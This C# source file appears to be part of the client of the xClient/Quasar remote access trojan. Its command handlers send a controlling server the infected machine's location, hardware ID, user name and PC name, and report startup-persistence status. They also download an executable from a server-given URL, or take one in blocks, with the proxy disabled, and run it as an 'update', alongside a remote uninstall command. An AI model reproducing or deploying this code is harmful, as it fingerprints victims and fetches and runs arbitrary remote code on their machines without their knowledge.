using System;
using System.Net;
using System.Threading;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Installation;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE CONNECTION COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetAuthentication(Packets.ServerPackets.GetAuthentication command, Client client)
        {
            GeoLocationHelper.Initialize();
            new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, PlatformHelper.FullName, WindowsAccountHelper.GetAccountType(),
                GeoLocationHelper.GeoInfo.Country, GeoLocationHelper.GeoInfo.CountryCode,
                GeoLocationHelper.GeoInfo.Region, GeoLocationHelper.GeoInfo.City, GeoLocationHelper.ImageIndex,
                DevicesHelper.HardwareId, WindowsAccountHelper.GetName(), SystemHelper.GetPcName(), Settings.TAG).Execute(client);

            if (ClientData.AddToStartupFailed)
            {
                Thread.Sleep(2000);
                new Packets.ClientPackets.SetStatus("Adding to startup failed.").Execute(client);
            }
        }

        public static void HandleDoClientUpdate(Packets.ServerPackets.DoClientUpdate command, Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            if (string.IsNullOrEmpty(command.DownloadURL))
            {
                if (!_renamedFiles.ContainsKey(command.ID))
                    _renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(".exe"));

                string filePath = _renamedFiles[command.ID];

                try
                {
                    if (command.CurrentBlock == 0 && !FileHelper.IsValidExecuteableFile(command.Block))
                        throw new Exception("No executable file");

                    FileSplit destFile = new FileSplit(filePath);

                    if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                        throw new Exception(destFile.LastError);

                    if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload finished
                    {
                        if (_renamedFiles.ContainsKey(command.ID))
                            _renamedFiles.Remove(command.ID);
                        new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
                        ClientUpdater.Update(client, filePath);
                    }
                }
                catch (Exception ex)
                {
                    if (_renamedFiles.ContainsKey(command.ID))
                        _renamedFiles.Remove(command.ID);
                    NativeMethods.DeleteFile(filePath);
                    new Packets.ClientPackets.SetStatus(string.Format("Update failed: {0}", ex.Message)).Execute(client);
                }

                return;
            }

            new Thread(() =>
            {
                new Packets.ClientPackets.SetStatus("Downloading file...").Execute(client);

                string tempFile = FileHelper.GetTempFilePath(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadURL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.SetStatus("Updating...").Execute(client);

                ClientUpdater.Update(client, tempFile);
            }).Start();
        }

        public static void HandleDoClientUninstall(Packets.ServerPackets.DoClientUninstall command, Client client)
        {
            new Packets.ClientPackets.SetStatus("Uninstalling... bye ;(").Execute(client);

            ClientUninstaller.Uninstall(client);
        }
    }
}